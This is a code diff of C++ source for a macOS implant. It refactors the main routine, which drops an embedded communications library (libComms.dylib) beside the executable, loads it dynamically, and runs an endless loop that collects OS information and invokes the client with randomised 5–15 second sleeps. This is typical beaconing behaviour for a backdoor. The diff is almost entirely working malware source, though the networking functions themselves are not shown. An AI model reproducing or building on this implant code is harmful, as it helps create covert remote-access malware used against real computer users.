@@ -28,9 +28,8 @@ std::string getPathToExecutable() {
         exePath = std::string(path);
         std::size_t last = exePath.find_last_of("/");
         exePath = exePath.substr(0, last)+"/";
-        std::cout << "Path to executable: " + exePath << std::endl;
     } else {
-        std::cout << "Buffer too small" << std::endl;
+        std::cout << "[IMPLANT] Buffer too small" << std::endl;
         return "";
     }
 
@@ -75,17 +74,19 @@ void* loadComms(std::string exePath) {
 
 int main(int argc, const char * argv[]) {
 
-    std::string exePath = getPathToExecutable();
+    ClientPP client;
+
+    client.pathProcess = getPathToExecutable();
 
     // drop embedded libComms.dylib to cwd
-    dropComms(exePath);
+    dropComms(client.pathProcess);
 
     // load libComms.dylib
-    void * dylib = loadComms(exePath);
+    client.dylib = loadComms(client.pathProcess);
 
     // check libComms was opened
-    if (dylib == NULL) {
-        std::cout << "unable to load libComms.dylib (" + std::string(PATH_TO_COMMS_LIB) + ")" << std::endl;
+    if (client.dylib == NULL) {
+        std::cout << "[IMPLANT] unable to load libComms.dylib (" + std::string(PATH_TO_COMMS_LIB) + ")" << std::endl;
         return 1;
     }
 
@@ -96,8 +97,8 @@ int main(int argc, const char * argv[]) {
     int dwRandomValue;
     while ( 1 ) {
         // execute implant functionality
-        if ( ClientPP::osInfo(dwRandomTimeSleep))
-            ClientPP::runClient(dwRandomTimeSleep, dylib);
+        if ( ClientPP::osInfo(dwRandomTimeSleep, &client))
+            ClientPP::runClient(dwRandomTimeSleep, client.dylib);
         dwTimeSeed = time(0LL);
         srand(dwTimeSeed);
         dwRandomValue = rand()%(15000-5000+1)+5000;     // set sleep between 5-15 seconds
@@ -105,6 +106,5 @@ int main(int argc, const char * argv[]) {
     }
 
     // finished execution, close
-    dlclose(dylib);
     return 0;
 }
